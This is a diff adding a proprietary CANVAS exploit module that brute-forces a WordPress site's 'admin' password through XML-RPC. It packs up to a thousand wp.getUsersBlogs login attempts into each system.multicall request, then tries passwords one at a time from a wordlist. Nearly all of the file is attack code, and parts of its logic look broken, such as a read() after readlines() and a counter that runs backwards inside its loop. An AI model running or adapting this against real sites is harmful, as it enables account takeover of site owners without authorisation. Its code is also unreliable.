@@ -1,0 +1,159 @@
+#! /usr/bin/env python
+# -*- coding: utf-8 -*-
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2015
+#
+
+
+import sys, time, os, thread
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from MOSDEF import mosdef
+import libs.spkproxy as spkproxy
+import canvasengine
+
+# GUI info
+NAME = "d2sec_wp_xmlrpcbf"
+DESCRIPTION = "Wordpress XML-RPC Brute Force Amplification Vulnerability" 
+VERSION="1.0"
+
+DOCUMENTATION = {}
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION['References'] = ""
+DOCUMENTATION['Date public'] = ""
+DOCUMENTATION['Versions Affected'] = ""
+DOCUMENTATION["CVE Name"] = ""
+DOCUMENTATION["Notes"] = ""
+
+PROPERTY={}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["All"] ]
+
+class theexploit (tcpexploit):
+
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.name = NAME
+    self.vhost = ''
+    self.port = 80
+    self.ssl = 0
+    self.dico = ''
+
+  def request_post(self, data):
+    ua = spkproxy.UserAgent("", exploit=self)
+    ua.addHeader("Content-Type", "application/xml")
+    proto = 'http'
+    if self.ssl == 1:
+      proto = 'https'
+    content = ua.POST('%s://%s/xmlrpc.php'%(proto, self.vhost), data)
+    return content
+
+  def runbf(self):
+    data1 = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>'
+    data2 = ""
+    data3 = '</data></array></value></param></params></methodCall>'
+    
+    num_lines = sum(1 for line in open(self.dico))
+    f = open(self.dico)
+    lines = f.readlines()
+    passwds = f.read().splitlines()
+    f.close()
+
+    num = count = 0
+
+    while num < num_lines:
+      if count < 1000:
+        num += 1
+        count += 1
+        if num >= num_lines:
+          data = "" + data1 + "" + data2 + "" + data3
+          content = self.request_post(data)
+          if 'admin' in content.lower():
+            self.log('Brute force amplification attack successfull')
+            self.log('Starting brute force enumeration')
+            while num <= num_lines:
+              num -= 1
+              password = str(lines[num])
+              data = '<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>%s</value></param></params></methodCall>' % password
+              content = self.request_post(data)
+              if 'incorrect' in content.lower():
+                self.log('Wrong username or password: admin/%s' % password)
+              elif 'admin' in content.lower():
+                self.log('Password found: admin/%s' % password)
+                return 1
+              else:
+                self.log('Invalid response from target')
+                return 0
+          else:
+            self.log('Brute force failed')
+            return 0
+        else:
+          password = str(lines[num])
+          data2 += str('<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>admin</string></value><value><string>'+password+'</string></value></data></array></value></data></array></value></member></struct></value>')
+      else:
+        count = 0
+        data = "" + data1 + "" + data2 + "" + data3
+        content = self.request_post(data)
+        data2 = ''
+        if 'admin' in content.lower():
+          self.log('Brute force amplification attack successfull')
+          self.log('Starting brute force enumeration')
+          while num <= num_lines:
+            password = str(lines[num])
+            data = '<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>%s</value></param></params></methodCall>' % password
+            content = self.request_post(data)
+            num -= 1        
+            if 'incorrect' in content.lower():
+              self.log('Wrong username or password: admin/%s' % password)
+            elif 'admin' in content.lower():
+              self.log('Password found: admin/%s' % password)
+              return 1
+            else:
+              self.log('Invalid response from target')
+              return 0
+          else:
+            self.log('Brute force failed')
+
+  def getargs(self):
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port", self.port))
+    self.ssl = int(self.argsDict.get("ssl", self.ssl))
+    if self.ssl < 0 or self.ssl > 1:
+      self.ssl = 0
+    self.vhost = self.argsDict.get("vhost", self.vhost)
+    self.dico = self.argsDict.get("dico", self.filename)
+    if not self.vhost:
+      self.vhost = self.host
+    return 0
+
+  def run(self):
+    self.getargs()
+    self.setInfo("%s attacking %s:%d" % (NAME, self.host, self.port))
+    self.log("%s attacking %s:%d" % (NAME, self.host, self.port))
+    if not self.runbf():
+      self.setInfo("%s attacking %s:%d - failed" % (NAME, self.host, self.port))
+      return 0
+    self.setInfo("%s attacking %s:%d - done" % (NAME, self.host, self.port))
+    self.log("%s attacking %s:%d - done" % (NAME, self.host, self.port))
+    return 1
+
+  def usage(self):
+    print "Usage: %s -t target [-p port:80] -O vhost:<url> -O dico:<pathname> -O ssl:0|1" % sys.argv[0]
+    sys.exit(0)
+
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME,VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
+
